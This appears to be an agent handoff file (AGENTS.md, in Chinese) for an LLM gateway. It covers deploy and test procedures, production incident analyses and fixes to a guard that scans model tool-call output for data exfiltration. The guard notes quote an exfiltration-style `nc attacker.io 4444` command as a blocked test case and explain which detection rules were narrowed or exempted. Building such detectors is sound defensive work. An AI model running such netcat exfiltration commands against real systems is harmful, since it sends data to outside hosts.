- `verify.sh` 在 `set -e` 下无条件 `go test ./...`；CI 上 `verify-ci.yml` 未对主作业
  加 `continue-on-error`。在故意红的负向闸门下，主门长期为红。这是**维护者策略**，
  不是回归，不要主动改 CI 或加白名单；任务 1 走的是上面那个子集，可在不上 CI 的
  情况下给出「非负向闸门子集全绿」的事实（2026-10-11 审计实测达成：admin/bg/
  domains/stats/settings 子集仅负向闸门一红）。

### 任务 2 — lite 模式本地冒烟（最低门槛）

**前置**：仅 Go + SQLite（无需 docker / Postgres / Redis）。

**步骤**：

```bash
LLM_GATEWAY_STORAGE_MODE=lite \
LLM_GATEWAY_SQLITE_PATH=/tmp/gateway-lite.db \
LLM_GATEWAY_SECRET_KEY=local-smoke-test-key \
LLM_GATEWAY_CORS_ORIGINS='*' \
bash scripts/start-lite.sh
# 等待 /healthz 返回 ready=true
curl -fsS http://localhost:8781/healthz
# 也可显式指 host：curl -fsS http://<host>:8781/healthz
# 本地 lite 走 v1(:8781)。远程机器端口另见仓库快照处的蓝绿端口说明。
```

预期：服务可启动；坏/缺凭据访问数据面应被 **fail-closed 拒绝**。两个必需 env
是 r1017 前后的 fail-closed 门加出来的，缺一不可（2026-10-11 实测，原文档的
`LLM_GATEWAY_LITE_DB_PATH` 变量名已过时，脚本认 `LLM_GATEWAY_SQLITE_PATH`）：

- `LLM_GATEWAY_SECRET_KEY`：缺了直接拒启——「lite mode requires data-plane
  authentication」（静态 key / keystore snapshot / 显式 ALLOW_UNAUTHENTICATED 三选一）。
- `LLM_GATEWAY_CORS_ORIGINS`：缺了启动 panic——CORS 必须显式配置（fail-closed）。

实测 fail 行为（都正确，不是放行）：无鉴权存储时 `/v1/models`、
`/v1/chat/completions` 返回 **503**（`database_unavailable` / 
`executor_unavailable`），坏 `sk-` key 拿不到模型清单；`/admin/users` 返回 200
但内容是 SPA 静态 HTML（前端路由 fallback），admin 数据在 `/api/admin/*` 后面。

`start-lite.sh` 内部走 `go run ./cmd/gateway`，等价于直接 `go run ./cmd/gateway` 加 lite 环境变量。

> **本机 Go 不在 `PATH` 上。** 工具链在 `~/sdk/go/bin/go`（1.27.1），
> 同类非标准前缀还有 `~/sdk/bash5/bin/bash`（5.2.0）。
> 跑任何 `go` 命令前先 `export PATH="$HOME/sdk/go/bin:$PATH"`。
> 参见第十九节：非标准前缀目录是本仓多次「某依赖不存在」误判的直接原因。

### 任务 3 — 真库回归（full 模式）

**前置**：安装 docker desktop（或 orbstack）+ Postgres + Redis。`brew` 不在时可用纯 docker run。

**示例**（macOS，无 brew）：

```bash
docker run -d --name llmgw-pg    -e POSTGRES_******************* -p 5432:5432 postgres:16
docker run -d --name llmgw-redis                                       -p 6379:6379 redis:7
```

**步骤**：

```bash
LLM_GATEWAY_STORAGE_MODE=full \
LLM_GATEWAY_DB_DSN='postgres://[REDACTED]@[REDACTED]:5432/postgres?sslmode=disable' \
LLM_GATEWAY_REDIS_ADDR=[REDACTED]:6379 \
bash scripts/deploy-local.sh
bash scripts/post-deploy-verify.sh     # SSOT 在 ~/workspace/ai-native-workspace/deploy-lib
```

连接信息与管理员凭据由用户侧决定，建议写 `.env.local`（不入 git）。

### 任务 4 — deploy-local 全链路回归门

```bash
bash tests/deploy_timeout_portability_test.sh   # rc=0
bash tests/deploy_local_contract_test.sh           # 仅在 SSOT 在场时跑（CI runner 上不存在，会挂主门，因此本轮未接入 verify.sh）
```

## 关键约束

- **合并需符合业务逻辑**：避免重复实现功能；保留上游降级契约，使用探针排除的积分源。
- **测试断言需剥离注释后再比对**；按 helper 参数化（不要内联字符串）。`goFuncBody` 已重命名为 `goFuncBodyStrict` 修复与上游测试文件重名问题。
- **部署脚本 macOS timeout 可移植**：禁止裸 `timeout` 调用，必须走 `scripts/deploy-local-lib.sh` 暴露的 `_dl_timeout` 封装。
- **回归门设计**：`tests/deploy_timeout_portability_test.sh` 零外部依赖，含静态断言（禁裸 timeout 调用并报行号）+ 行为断言（仅在确实无 `timeout` / `gtimeout` 时跑）。
- **CGO**：测试**子集**（admin/bg/domains/stats/settings）用 `CGO_ENABLED=0` 避免环境问题；`./cmd/...` 与 `./db/...` 必须开 CGO（SQLite 驱动），见任务 1 的 CGO 边界说明。
- **依赖安装属用户侧决策**：本助手不做越权安装。
- **负向闸门不擅自加白名单**：维护者裁决。
- **SSOT 软链**：`scripts/deploy-lib` 已迁移到 `ai-native-workspace/deploy-lib`。其他机器拉到此 commit 后按需 rebind：
  - 若仍在 `ai-native-tools/` 下：`git checkout HEAD~1 -- scripts/deploy-lib`
  - 若也已迁到 `ai-native-workspace/`：无需任何操作
  - **2026-10-16 更新（a968b6f61）**：HEAD 链接已修正为 `../../../deploy-lib`（= `ai-native-tools/deploy-lib`），在 `ai-native-tools/` 下无需再 rebind；勿按上文 `checkout HEAD~1` 回退——那会恢复已确认悬空的旧链接（指向不存在的 `../../ai-native-workspace/deploy-lib`）

## 仓库内 `handoff` 命名的语义警告

仓库内 `domains/streaming/handoff_*`、`domains/hostedtask/handoff.go`、`admin/handoff_logs_handler.go`、`settings/handoff_specs.go` 中的 "handoff" 都是**业务流交接**（流式分块确认、托管任务交接、settings 1m 契约测试），不是"会话间交接"。下次遇到用户口语"用 handoff 技能把提示词放到会话里"这种说法，按本 `AGENTS.md` 对待；不要调用任何 builtin 名为 handoff 的工具（builtin 列表里也没有）。

## 新增迁移的同步纪律（2026-10-11 补记，845-851 八连红的教训）

新 canonical 迁移（`sql/migrations/startup/NNN_*.sql`）落地时，**五点 installer 同步**
（embeddata 副本、main.go go:embed 变量 + embeddedSQLFiles map、dbinit StartupFiles、
豁免 parity map——见 `TestCanonicalStartupMigrationsAtOrAbove704AreRegistered` 的报错文案）
**和通道腿登记**（`scripts/apply-db-revision-sequence.sh` 的 files 数组，除非明确落入
该测试的某张豁免表）**缺一不可**。两类缺口的形态都出现过：只做 installer 漏 main.go
（851，e47c1102b）、只做 installer 漏通道（845-848，8429b1524）。判别命令：

```bash
bash scripts/apply-db-revision-sequence_test.sh   # 通道腿 + installer 腿对账，rc=0
cd installer && go test ./...                     # 五点同步对账 + 重新生成 TSV 用 -run TestStartupManifest -update
```

## 已落地的回归门

```bash
bash tests/deploy_timeout_portability_test.sh        # rc=0；失败即 deploy-lib 出现裸 timeout
bash scripts/apply-db-revision-sequence_test.sh      # rc=0；失败即迁移投递腿登记缺口
cd installer && go test ./...                        # rc=0；失败即 installer 同步缺口
```

## ⚠️ 部署脚本的 ENVS_ROOT 默认值已过时（2026-10-11 深夜实测踩到）

`scripts/deploy-seamless.sh:163` 的默认值是
`${HOME}/workspace/ai-native-workspace/envs`，而仓库已迁到
`ai-native-tools/envs`，直接跑会失败：

```
✗ envs SSOT loader not found: /Users/niuer/workspace/ai-native-workspace/envs/loader.sh
```

绕过（**未改共享脚本**，那是部署基础设施 SSOT，改动应由其维护者裁决）：

```bash
ENVS_ROOT="$HOME/workspace/ai-native-tools/envs" bash scripts/deploy-seamless.sh deploy 245 --seq NNNN
```

`--seq` 也可能不被采纳（实测传 2538 到 154，release 落成 2547）——**以部署脚本
回显的 `version=` 为准**，不要拿自己传的 seq 去核对产物目录名。

## 部署 245 的实操（2026-10-11 全程走通）

```bash
export PATH="$HOME/sdk/bash5/bin:$HOME/sdk/go/bin:$HOME/.nvm/versions/node/v22.23.3/bin:$PATH"
export AIAN_DEPLOY_LIB="$HOME/workspace/ai-native-tools/deploy-lib"   # 见下方 SSOT 说明
cd <本 checkout>
bash scripts/deploy-245.sh --seq <seq>          # seq 必须自增且不与他人撞
```

踩过的坑：

1. **系统 bash 3.2 跑不了 deploy-lib**（`${target^^}` 是 bash 4+ 语法，报
   `bad substitution`）。必须用 `~/sdk/bash5/bin/bash`。
2. **前端要自己先构建**：`web/dist` 与 `web-mobile/dist` 缺失时 deploy 会
   refuse。先 `corepack prepare pnpm@10.29.2 --activate`，再在两个前端目录
   各跑 `pnpm install --frozen-lockfile && pnpm build`。
3. **`scripts/deploy-lib` 是相对软链**，在本 checkout 里指向
   `../../ai-native-workspace/deploy-lib`（**不存在**），实际 SSOT 在
   `~/workspace/ai-native-tools/deploy-lib`。要么 `export AIAN_DEPLOY_LIB=...`
   指过去，要么用 `scripts/deploy-lib-resolve.sh`。
4. **部署锁会与并发 checkout 抢**：`/tmp/kx-llm-gateway-deploy-245.lock`。
   锁元数据里能看到持有者 pid 与 checkout 来源。**别用 `--force` 硬抢**——
   等待即可（实测等待约 3 分钟后对方完成）。硬抢会打断对方的蓝绿切换，
   留下一半状态（245 的 8781 曾因此掉线）。
5. **部署会改脏工作区**：`VERSION`、`version.json`、`web/public/version.json`、
   `web/public/menu-config.json`、`docs/db-changelog.md` 每次 deploy 都被改写。
   提交前 `git checkout --` 掉它们，别把部署产物混进提交。
6. **部署后端口可能不是 8781**：handoff 输出里的 `active_port` 才是权威值。

### SSOT 软链的真实情况

**2026-10-11 晚间复测更正（多 checkout/多机事实不同，用前必须实测）**：
下午那轮「ai-native-tools 已从本机消失、软链解析有效」的记录**对本
checkout（llm-gateway-go）不成立**——22:xx 实测：`ai-native-tools/deploy-lib`
**在场**、`ai-native-workspace/deploy-lib` **不在**，本 checkout 的
`scripts/deploy-lib` 软链（目标 `../../ai-native-workspace/deploy-lib`）**断链**
（deploy_local_contract_test 在 cd 软链处挂）。下午的记录可能出自另一份
checkout 或当时目录状态确有变化（同日 `~/sdk/bash5` 确被清过一次）。
**结论不变的部分**：任何会话跑 deploy 相关脚本前先 `ls` 确认两处 SSOT
哪个在场，用 `AIAN_DEPLOY_LIB` 指向在场的那个；软链 rebind 仍留维护者裁决。

### host-first 本地部署的 2538 轮新坑（2026-10-11 下午实测）

1. **显式 DSN 会把 `DL_DB_MODE` 定成 `external`，跳过 host claim 的
   `dl_export_host_bin_path` PATH 注入**——部署中段直接 die 在
   `psql is required for database verification`。对策：跑部署的 shell
   自带 `PATH="$HOME/kaixuan/pg18/bin:$HOME/kaixuan/redis/bin:..."`。
2. **ZCode 会话的嵌套 bash 环境里 `netstat -an` 输出缺整个 TCP/LISTEN 表**
   （只剩 Multipath/LOCAL/kernel 段；`lsof -iTCP` 正常；真终端里 netstat
   正常——02:44 同机部署过此关）。`dl_redis_host_listen_ports` 靠 netstat
   枚举端口 → `dl_redis_try_host` 恒失败 → die `no usable PostgreSQL/Redis`。
   对策（不改产品代码）：`export LLM_GATEWAY_DATABASE_URL=postgresql://huangxt@127.0.0.1:54318/llm_gateway?sslmode=disable
   LLM_GATEWAY_REDIS_ADDR=127.0.0.1:6379`——发现链 Tier 1 caller 显式配置
   最优先，完全绕开 netstat 探测。这也顺带解释了 2533/2534 轮与 2538 轮
   行为差异：探测成败取决于跑部署的 shell 环境，不在代码。
3. 2538 起部署收尾多了孤儿网关清扫（见「已完成」2026-10-11 下午审计轮）；
   `run/gateway.build` 是每次部署的构建暂存产物，属正常残留，不用手工清。

---

# 追加：2026-10-11 深夜轮——154 全局变慢根因修复（UrsmlHealthyKeyReconciler）

> 会话时间 2026-10-11 23:29 → 10-12 01:00。用户目标：154 网关响应非常慢，
> 分析 154 网关 + 252 网关数据库日志，修正后优化 252 数据库，验证后提交推送。
> **已完成分析、止血、代码修复（含变异验证）、252 DB 优化项核验、提交推送。**

## 根因（端到端证据链，全部实测）

1. **症状**：`/v1/chat/completions` p90=16.8s、p99=889s、max=85 分钟；
   `router: URSM v2 authoritative view filtered out every candidate` 告警全天上升
   （15 时 21 条 → 22 时 352 条）。机制：候选全灭后请求进
   `wait_recovery_window`——30s 间隔、deadline 5 小时（`deadline_remaining_sec:17999`），
   客户端拿到 200+keepalive 后被一直挂着 = 用户看到的「非常慢」。
   受灾模型：gpt-6-astra(566)/glm-5.3(482)/claude-opus-5(373)。
2. **直接原因**：URSM v2（Redis db2，authoritative 模式）里这些健康凭据的
   节点键缺失/过期。T4 契约：**缺键 = Available=false**（fail-closed 保护拒绝）。
3. **为什么会缺**（结构性，三件事叠加）：
   - 2026-09-20 probe-volume 政策（`MarkNodeProbeHealthy`）：每次成功业务请求把
     node_probe_state 行 park 30 天（`next_retry_at = now() + interval '30 days'`，
     bg/node_probe.go:1510）——健康对**不再有任何主动探测**。
   - 节点键只剩请求遥测在写（record_request.lua，priority=10，**分钟级 TTL**）。
     probeWriteTTLFloor=7h 只作用于探测写，而 park 政策后探测写永不发生。
   - 流量间隙 > TTL ⇒ 键过期 ⇒ 全灭 ⇒ park 5h；park 期间**无遥测、无探测、无恢复
     路径**（36h lookback 只覆盖 `cmb.available=FALSE` 的绑定，健康对是盲区），
     直到每天 ~00:30 integrity_verify 清扫才自愈。**这是死锁式锁死**。
4. **今日放大器**：15:45:58 一次 `redis_unavailable` recovery（epoch 哈希：
   recovery_counter=5537、recovered_keys_count=769）用快照覆盖/替换了大量节点键
   ——此后告警从个位数暴涨。recover 之所以被触发：persist collect 对共享 db2
   （**170 万键**）做全量 SCAN，30s 预算实测要 12.95–30.40s，频繁 i/o timeout
   （gateway 日志 `persist collect failed` 多条）。代码注释（cmd/gateway/main.go
   URSM_V2_REDIS_DB 段）自己就预言了这个代价。
5. **旁证**：gateway 模式探测全部 401（r1016/r1017 鉴权修复连带，node_probe_runs
   里 `gateway_ok=f 401` vs `direct_ok=t 200`）；direct 探测不受影响。

## 已落地

1. **止血（生产 Redis，~00:10-00:45）**：按 DB 健康谓词（bindings available +
   credentials active/ready + providers enabled + nps 无失败）筛出 253 对健康绑定，
   用 apply_probe.lua 成功语义重写节点键（priority=20，TTL 7h）；其中唯一
   单凭据无探测覆盖的 gpt-6-astra 单独补写。**效果：告警 100+/10min → 00:41 起 0**。
2. **代码修复（本提交）**：`bg/ursm_healthy_reconcile.go` +
   `bg/ursm_healthy_reconcile_test.go` + `cmd/gateway/main.go` 接线（bootstrap 块后）。
   `UrsmlHealthyKeyReconciler`：默认 60s tick（settings_kv
   `ursm.healthy_reconcile_interval_seconds`，<=0 关闭），每轮把 **DB 验证健康**
   的可路由对经 `FilterAndScoreReady`（单条 pipeline，无 SCAN）读视图，
   对判不可用者走 `ApplyProbeForTenant(success=true)`（与探测同路径：
   probe 优先级 + 7h TTL floor + manual_hold 让步 + 冷却即恢复）。
   安全边界：只写 DB 健康对（T4 fail-closed 对无证据对不被打穿）；
   ready 门关着时整轮跳过；authoritative 模式空租户对跳过。
   **7 个单测 + 两轮变异验证有牙**（删 Available 过滤→红；绕 ready 门→红；
   第一版关闸测试因未播种 DB 行是假绿，已修——AGENTS「判据必须在同一层」再+1）。
3. **252 数据库优化项核验**：`archive_request_logs_default` 实测已含
   `gw_session_id` 且手动执行成功（42703 已消，幂等重放已被并行会话完成）。
   其余 PG 负载（analyze_llm_gateway_table_stats 均值 150s×25、session 分析族、
   MV 刷新）为产品功能非故障，未动。

## 待办（下一轮）

1. ~~**★ 重部署 154/245 网关使 reconciler 生效**~~ **已完成（2026-10-12 凌晨轮）**：
   154=2550-a87a134a（本会话 2549→2550 两轮）、245=2548-a87a134a（并行会话）。
   两台日志均出现 `ursm.v2 healthy-key reconciler started`（interval 1m0s），
   repaired 每轮 24~133 并在收敛；154 部署后 E2E 3/3、245 5/5（含 r1019 的
   `nc attacker.io 4444` 转阻断）回归全过。
2. **URSM_V2_REDIS_DB 迁移到独立 db**（代码已支持，注释在 main.go URSM 段）：
   一并消除 persist SCAN 走 170 万会话键的超时 → redis_unavailable 假恢复
   的触发源。需要重启 + coverage bootstrap 收敛，留维护者窗口。
3. 观测：`ursm:v2:meta:epoch` 的 recovery_counter（5537）与
   `persist collect failed` 频率是本链路的健康表；接线到 /metrics 更好
   （与已登记的 A2 量具缺口同类）。
4. 现场残留：Redis db2 有少量键名含 `':'` 引号的乱码节点键
   （如 `ursm:v2:node:default':'61':'gpt-6-astra`，来源未定，疑似并行会话/脚本；
   无读方，无害）。凌晨轮尝试顺手清理：`/etc/llm-gateway-go/env` 的
   `LLM_GATEWAY_REDIS_PASSWORD` 与 `LLM_GATEWAY_REDIS_URL` 内嵌口令对
   172.16.2.210:6389 均 NOAUTH——网关运行时凭据与该实例的认证不对应，
   清理需维护者提供正确凭据，未强行继续。
5. gateway 模式探测 401（r1017 连带）与 EOL 措辞 contains 脆弱（已登记项）
   未动；glm-5.2 系 410、sensenova 系等模型目录漂移仍待 owner 拍板。

---

# 追加：2026-10-11 154/252 事故与批判式审计（root 会话 `mvs_771078044a9a4dc8960546e26f653367`）

## ⚠️ 先更正本文件上方一处我自己的错误结论

上一轮我断言「本机只有 bash 3.2，没有 bash 4+，deploy-lib 的 `${var^^}` 阻塞部署，
需打补丁副本绕过」。**该结论是错的**：我只查了 `/opt/homebrew/bin`、`/usr/local/bin`、
`/bin` 就下了判断，漏了 `~/sdk/`。

实测（2026-10-11）：

```bash
~/sdk/bash5/bin/bash --version        # GNU bash 5.2.0
~/sdk/bash5/bin/bash -c 't=154; echo "HOST_${t^^}_ROOT"'      # HOST_154_ROOT  ✅
~/sdk/bash5/bin/bash -c 'set -euo pipefail; a=(); printf "[%s]\n" "${a[@]}"'  # []  ✅
# 对照 /bin/bash 3.2：bad substitution / unbound variable
```

⇒ **deploy-lib 不需要任何修改，也不需要打补丁副本**。用
`~/sdk/bash5/bin/bash scripts/deploy-154.sh` 即可，两个构造都正常。
上方「部署 245 的实操」一节已经写对了，本条只是提醒别再重复我这个误判。

## 本会话 checkout 与上方记录不一致

上方「仓库快照」写的是 `llm-gateway-go-cursor`，**本会话实际在
`llm-gateway-go-5`**。这是第三份 checkout（与 `-cursor`、无后缀那份并发）。
部署锁会互相抢，提交前务必 `git fetch && git status -sb`。

## 154/252 事故（已修复并验证）

根因是单条链：`scripts/252-monitor/pg17-disk-watch.sh` 每 10 分钟被 cron 拉起，
但既无单实例锁也无任何超时。PG「半死」时 psql 永久挂起、副本只增不减 →
内存耗尽触发内核 OOM → 15:54:42 杀掉 llmgw Redis（`exit=137`，已 crash-loop 4 次）
与 PG 后端 → PG 对 154 返回 `57P03` → 一小时 194 个 503。

现场峰值：load **334**、进程 **3012**、副本 **310** 份、僵死 `docker exec psql` **154** 个、
`du` 卡 D 状态 11 个、swap **4095/4095 全占**、`oom_kill` 累计 414。

处置后实测：load 334→**14.5**、进程 3012→**508**、Redis 6389 恢复、`docker exec` 可用。
详见 `scripts/252-monitor/README.md` §11（事故）与 §12（对其自身修复的批判式审计）。

已推送：`b6e38b709`（两道闸）、`aba353243`（web-mobile lockfile）、
`11f46052c`（部署身份 2522）、`c88bc79e3`（审计修复 5 个缺陷）。

## ★ 154 的 503 主线：口径已修正，实况大幅好转（2026-10-11 午间复测）

**上轮本节的「50-69% 失败率」口径是错的**，三类噪音混进了 `success` 列的统计：
探针自身失败（`probe_direct_*`，6h 约 3090 条被记进 request_logs）、
**invalid_key 401 风暴**（6h 1566 条——一批失效 `sk-*` key 在 09:36-09:38
集中轮换重试，已自停）、以及 transient/provider_error 等。真实口径：

- HTTP 503 ≈ **2.5%**（网关日志 2000 条中 49 条）；真实路由失败
  （no_candidate/no_candidates）6h 仅 143 条；11 时真实成功率约 75%。
- claude-opus-5 的失败 95% 是 401 风暴连带，`fp_slot_saturation_critical` 已缓解。
- `health_auto_recover` 11:26 捞回 97 个凭据绑定，自愈在正常工作。

**模型目录漂移仍是实体问题**（也是原拍板项的实体）：12 个凭据、96 个模型名
404/410（nvidia-build-new/v2、endless 各约 80 绑定全灭；sensenova 系 5 凭据；
glm-5.2 系 10×410）。**待 owner 拍板：清退 / 修目录 / 降权**——本轮未动生产数据。

**新发现真 bug**：生产 `archive_request_logs_default` 仍是 754「S-01 首跑即死」
修复前的坏版本（42703），TTL 归档从未工作；重放 754 即修（幂等，步骤在审计文档 §五）。

**观测口径陷阱**：实时数据在 `request_logs_hot`（8h 窗口 → promote 排水到月
分区），查 `request_logs` 父表有 8 小时滞后——审计统计成功率一律用热表或
按 `error_kind` 细分，别再拿父表 `success` 列算比率。

详见 `docs/audit/2026-10-11-154-503-口径修正与漂移清单.md`（含漂移全景表、
401 风暴分析、754 重放步骤）。

## deploy-154.sh 本会话实测（与 245 的差异）

1. 端口：154 本会话结束时 active_port=**8781**（`/opt/llm-gateway-go/run/active-upstream.conf`
   是唯一权威）。部署期间出现过 8782 → 8781 漂移，**探活两个端口都要试**。
2. `--force` 的正确用法：仅当**确认持有者是已死进程**时。上方 245 一节说「别硬抢」
   是针对**并发 checkout 的活部署**。本会话遇到的是我自己上一轮崩在 bash 错误里
   留下的 stale lock（metadata 里的 pid 已不存在、且无 deploy 进程在跑），
   这种 stale 场景用 `--force` 是文档给出的正确恢复路径。
   **判据**：先 `cat` 锁 metadata 看 pid/source_user，再 `pgrep -af deploy` 确认无活进程。
3. 前端依赖：`web-mobile/package-lock.json` 与 `package.json` 不同步会让
   `npm ci` **整体失败**（连构建都不开始）。已用
   `npm install --package-lock-only` 重生成修过一次；**改依赖后记得同步**。
4. 部署全程需要：`PATH` 含 `~/sdk/go/bin`（go1.27.1）与
   `~/sdk/bash5/bin`（deploy-lib bash 4+ 语法），否则分别在后端构建与 lib 加载处失败。

## 2026-10-11 晚间 24h 审计轮（窗口 10-10 22:16 → 10-11 21:16，46 提交逐条批审）

**拉取**：快进合并 `9fe5320b6..b98678fc5`（6 提交：SPA 深链 401 放行 r2540、
host-first 孤儿网关回收 + 517 形态探测 r2538、mobile UX 第二轮、252 netbird 文档、
12h 审计 A1/A2、r1016/r1017 生产复验文档）。

**全门状态（本轮实测）**：`go build ./...`、`go vet ./...` rc=0；
`apply-db-revision-sequence_test` rc=0；installer 13 包全绿；
`CGO_ENABLED=0 go test ./admin/... ./bg/... ./settings/... ./domains/stats/...`
仅负向闸门 `TestV1BodiesReadersAreAssessed` 一红（维护者策略）；新增测件
`middleware`（含 auth_mw 三件套）ok、`tests/deploy_local_reap_test.sh` rc=0；
`security/...` 全绿、`domains/streaming` ok（168s）；web-mobile 193 文件
7177 测试全绿。

**三族实质发现（已修/已登记）**：

1. **a60391fb0（SPA 深链 text/html 放行）放行面核验通过，但安全性是隐式的**——
   逐条核验了 AuthMiddleware 守卫范围内全部 mux 路径：`/internal/*`、
   `/api/v1/plugins/*` 自带 AdminToken/AdminMiddleware 守卫；
   `/v1beta/models/`（**不匹配** `/v1` 前缀判断）与 `/v1/models/` 挂的
   GeminiHandler 对列表形状 404、对 `:generateContent` 交给 ChatHandler
   内嵌 keyVerifier 段二次鉴权（handler.go:2315，fail-closed）——无匿名暴露面。
   已在 `middleware/auth_mw.go` 的 `spaProtectedPrefixes` 上补维护契约注释：
   未来把无自守卫的新 handler 挂顶层路径必须同步加清单，否则 text/html 匿名直达。
2. **9fe5320b6 A2 的 `PermanentlyDisabled`/`PermanentRejections` 无生产消费方**
   （Stats() 只被测试调用）——自禁用事件有 slog.Error 兜底（日志可见），
   缺聚合视图，P3 遗留：接线到 /metrics 或 admin 端点留给下轮。
3. **AGENTS SSOT 段文档失真已更正**（上方「SSOT 软链的真实情况」节）：
   下午「ai-native-tools 已消失、软链有效」对本 checkout 不成立，实测
   ai-native-tools 在场、ai-native-workspace 不在、软链断——多 checkout/
   多机事实不同，用前先 ls。

**遗留（登记不修）**：12272e57c 的 EOL 识别靠措辞 contains（"end of life"/
"no longer available"），上游换文案会漏判回凭据级（probe 风暴复发点）；
窗口外 8 条 UNMERGED 远端分支（最后提交 ≤09-28，清单见审计输出）按保守口径
只登记不删；本地 2 条已合并 sanitize 分支同口径。

**分支窗口结论**：24h~1h 窗口内零未合并分支，无需删/合并动作。

**补充（推送时合并进来的 r1018，a39bb6769）**：并行会话对 r1016/r1017 做批判审计，
发现两条自引入的大面积误伤——`pkg@1.2.3` 被 egressHostFromUserInfo 当成
`user@host` 整类阻断装包命令；`nc attacker.io 4444` 收口正则误伤
`node server.js 8080` 形态的脚本调用。r1018 撤掉这两条有害提取规则（其原覆盖面
本就由 email/IP 规则 + r1017 的 isNonExfiltrationEmailFragment 兜住）。
**本晚间审计轮批读 a3b65ba68 时未深审到这两个误伤面，属审计盲区，如实记录**。
下一轮生产复验若见「装包/脚本调用不再被阻断」即 r1018 效果，非回归。

---

# 追加：2026-10-13 S4 停写切换已执行（本机 host-first 本地网关）

> 会话轮：gpt-5.6-sol 无响应修复（134ee0cea）之后的存储切换轮。
> **本节只描述本机本地网关（~/kaixuan/llm-gateway-go-v2，:8782）；生产
> 154/245/252 未翻转，写路径仍是双写。**

## 当前状态（settings_kv，热加载）

- `storage.request_logs_write_enabled = false`（07:01 翻转）——request_logs_hot /
  request_logs_bodies_hot 停写，行数冻结（8659 / 冻结点）。
- `storage.session_bodies_native_read = true`——SessionBodiesSourceSQL() 消费面
  （导出/对比/auto_title 等 13+ 站点）直读 session_bodies 家族。

## 切换前置核验（已通过）

- dual-read-drift 168h（7 天）：genuine_loss=0、coverage 100%、s4_ready=true
  （internal_loopback 816 全部为 session_title 回环，按设计排除）。

## 本次落地的交接/收尾（提交 6b377939b + 1d5cf0818，主体为并行收口）

1. **session_summaries 交接写入器**（internal/sessionv2mirror/session_summary_dim.go）：
   原来唯一喂方是 request_logs_hot 触发器（trg_update_session_summary +
   trg_sync_session_task_id），停写即断粮、会话管理/分析面冻结。写入器挂
   PersistHook dims，逐列对齐触发器语义；**v1 写入开启时自 no-op（双喂门，
   翻转即交接/回切即交还）**；realdb 判据 + 变异验证（去掉门/首值改覆盖均红）。
   有意差异：只计终态、不计内部回环、不计探针合成会话（比触发器口径干净）。
2. **bodies 读兜底腿**：logs.go fetchRequestBodies/fetchRequestOutboundBody、
   unified_detail loadOutboundBody、body_resolver lookupControlledBody 在 v1
   双腿 miss 后按 request_id 兜底 session_bodies（纯增量，旧行为不变）。
   body_resolver 的 ts 等值 JOIN 在 session 分支 99.85% 不命中（§9.231），
   兜底按空正文补查。已知边界：非流式 chat 的 request_delta 本就是 jsonb-null
   （翻转前即如此，终态 entry 不载请求体）——兜底只能给出 session 侧有的。
3. **auto_route decisions task_type NULL 扫描修复**：停写后探针类 auto 请求
   只走视图 session 分支，task_type NULL，原 string 扫描整页 500。
4. **退役门钉子随迁**：body_resolver/unified_detail 移出 v1ArmLiteralBlindSpot
   （39→37）入 v1ReaderIndirectPopulation（22→24、并集 116 不变）。

## 剩余债务（未做，按门跟踪）

- `TestV1BodiesReadersAreAssessed` 仍故意红：27 文件/39 站点 bodies 读方逐点
  评估是删除 request_logs_bodies 的前置，不是停写前置。
- ~~`TestReaderPopulationGroundTruth` 红：bg/candidate_failure_monitor.go 未登记~~
  **已修（2026-10-13 S3 波 2 轮）**：基线 48→49 补记成员资格（档位 ③ 早已在场）。
- ~~其它 ~35 个 request_logs_hot 直读面~~ **S3 波 2 第一分片已完成（2026-10-13，
  合并 87da7fade + 04801872b，本地部署 2587 验证通过）**：16 个生产读点按谓词
  形态分派修复（A 形会话内读→ForSession 助手；B 形→canonical 视图；性能裁决
  在案→会话族原生源拼接；热表点查→双热腿 UNION），含凭据健康核心
  recent_success_rate 双热腿化与 routing_analytics_source 视图化（boot 自愈 +
  陈旧判据，**量具坑：pg_get_viewdef 不内联嵌套视图**，按直接 FROM 引用判）。
  审计网络全绿（唯一红 = bodies 故意负向闸门），明细见
  `docs/audit/2026-10-13-s3-wave2-requestlogs-readsource-migration.md`。
  **剩余**：tenants.go logsTable（R36-A1 性能裁决，需专门分片）、探针面族
  （观测对象无处落表，属主拍板）、routing.go picker（有 live 腿兜底）、
  trace_events 结构缺口、auto_index_refresher 名字匹配率核对、
  data_lifecycle blob 治理会话臂扩展。
- 视图 session 分支的列投影里 task_type 等列可为 NULL：非空扫描的读方可能
  还有漏网（auto_route 已修一处），发现一处修一处。

## 生产切换提示（owner 决策）

生产 154/245/252 若要执行同一切换：重放本地这轮的代码（已在 main）+
对生产 settings_kv 翻转两个键。前置：生产库跑 7 天 dual-read-drift 零漂移；
**本地库的 update_session_summary 触发器 bug 版（DECIMAL(10,6)）在 252 镜像
里也疑似存在，翻转前建议先应用 661 迁移**（幂等，本地已验证）。

---

# 追加：2026-10-13 r1020 —— minimax-m3「模型未返回任何数据」= 输出合规误伤 Write 工具

> 用户报告：ZCode 经本地网关（:8782）请求 minimax-m3 频繁报「模型未返回任何数据」。
> 根因：防外传守卫对 tool 参数里**每个字符串**做目的地检查，而 coding agent 的
> 参数主体是 Write/Edit 写入的文件内容——源码引用公网 URL（`https://acc.kxpms.cn`）
> 与 `casdoor.ts:455` 文件名:行号（被 egressHostFromPort 当成 host:port）都会把
> 整条响应 `output_policy_blocked`（chunk_count 0，客户端零内容）。
> 修复两层：① 惰性内容工具（Write/Edit 族封闭集）按载体能力豁免外传检查
> （标签 `__tool_json@<工具名>`，凭据键检查不豁免，未收录名默认 fail-closed，
> 流式跨帧名字经 complianceStreamState.toolNames 侧信道）；② host:port 冒号
> 形态改为网络动词锚定（netcat 族+curl/wget/httpie），文件名:行号不再误伤。
> 判据 `security/sanitize/r1020_inert_tool_content_test.go`（三协议流式形状 +
> 前提在场配对 + 封闭性钉子），变异验证 M1/M2/M3 三方向红在正确断言。
> **夹具坑三则**：帧构造先转义 `\` 再转义 `"`；手写 SSE 帧闭合括号数三层；
> 终态帧的阻断信号在 ShouldBlock 不在 error。
> 详见 `docs/audit/2026-10-13-minimax-m3输出合规误伤write工具-r1020.md`。
> 遗留：本地网关需重部署生效（勿从含并行会话半成品的 checkout 部署）；
> telemetry/streaming-alternatives 两处测试红是并行会话 S4 迁移半成品
> （pristine + 其单文件即复现），与本修复无关。

> **r1020b 补丁（同日，提交 80bf575d6，随 2581 上线）**：2579 复验发现
> /v1/responses 仍拦 Write+URL——桥接器每工具多发一帧
> `response.function_call_arguments.done`（完整参数+name 在事件根），
> collectVisibleText 对该快照帧未挂名 → 裸 `__tool_json` 立即检查 → 豁免失效。
